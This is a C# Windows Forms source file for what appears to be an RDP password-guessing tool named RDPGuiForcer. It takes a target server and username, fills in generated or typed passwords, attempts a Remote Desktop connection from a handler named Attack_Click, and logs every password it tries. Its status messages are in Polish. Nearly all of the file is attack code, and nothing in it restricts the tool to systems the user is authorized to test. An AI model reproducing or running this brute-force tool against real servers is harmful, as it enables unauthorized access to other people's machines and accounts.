using MSTSCLib;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using RDPForcer;
namespace RDPGuiForcer
{
    public partial class Form1 : Form
    {
        bool hidden = true;
        public Form1()
        {
            InitializeComponent();
            
            rdp.OnAuthenticationWarningDisplayed += Rdp_OnAuthenticationWarningDisplayed;
            rdp.OnLogonError += new AxMSTSCLib.IMsTscAxEvents_OnLogonErrorEventHandler(this.Rdp_OnLogonError);
        }

        private void PlusButton_Click(object sender, EventArgs e)
        {
            if(hidden || splitContainer1.SplitterDistance > 600)
            {
                this.splitContainer1.SplitterDistance -= 200;
                hidden = false;
            }
            else
            {
                this.splitContainer1.SplitterDistance += 200;
                hidden = true;
            }
        }

        private void Attack_Click(object sender, EventArgs e)
        {
            try
            {
                rdp.Server = ServerNameBox.Text;
                rdp.UserName = UsernameBox.Text;
                var password = PasswordGen.Generate();
                if (Generated.Checked)
                {
                    rdp.AdvancedSettings9.ClearTextPassword = PasswordBox.Text = password;
                }
                else
                {
                    rdp.AdvancedSettings9.ClearTextPassword = PasswordBox.Text;
                }

                rdp.AdvancedSettings9.DisplayConnectionBar = true;
                
                rdp.AdvancedSettings9.EncryptionEnabled = -1;
                rdp.AdvancedSettings9.EnableCredSspSupport = true;
                rdp.AdvancedSettings9.NegotiateSecurityLayer = false;
                rdp.AdvancedSettings9.AuthenticationLevel = 2;

                
                rdp.Connect();
                if(!PasswordsUsed.Items.Contains(password))
                {
                    PasswordsUsed.Items.Add(password);
                }
                
                ErrorLog.Text = String.Format("Trwa próba nawiązania połączenia do {0}", ServerNameBox.Text);
                ErrorLog.Text = String.Format("Status połączenia: {0}", rdp.Connected.ToString());
                
            }
            catch(Exception ex)
            {
                ErrorLog.Text = ex.Message;
            }
        }

        private void Rdp_OnLogonError(object sender, AxMSTSCLib.IMsTscAxEvents_OnLogonErrorEvent e)
        {
            MessageBox.Show("A HA!");
        }

        private void Rdp_OnAuthenticationWarningDisplayed(object sender, EventArgs e)
        {
            MessageBox.Show("Kto pierwszy!");
            
            ErrorLog.Text = "Błedne dane logowania on authenticationwarningdisplayed";
        }


        private void StopButton_Click(object sender, EventArgs e)
        {
            try
            {
                if (rdp.Connected.ToString() == "1")
                {
                    rdp.Disconnect();
                }
            }
            catch (Exception ex)
            {
                ErrorLog.Text = ex.Message;
            }
        }

        private void Generated_CheckedChanged(object sender, EventArgs e)
        {
            if(Generated.Checked)
            {
                PasswordBox.Enabled = false;
                PasswordBox.Text = "";
            }
            else
            {
                Password.Enabled = true;
            }
        }
    }
}
